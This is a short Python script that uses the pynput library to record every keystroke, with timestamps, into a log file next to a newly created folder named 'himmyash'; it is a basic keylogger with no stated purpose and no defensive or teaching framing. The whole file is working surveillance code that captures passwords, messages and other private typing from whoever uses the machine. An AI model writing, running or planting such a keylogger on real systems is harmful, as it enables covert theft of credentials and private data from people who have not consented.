import os
import pynput
from pynput.keyboard import Key, Listener
import logging


#Specifies the path for the directory
path = './himmyash'

try:
    os.mkdir(path)
except FileExistsError:
    print("Folder %s already exists" % path)

log_dir = r"./himmyash"

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()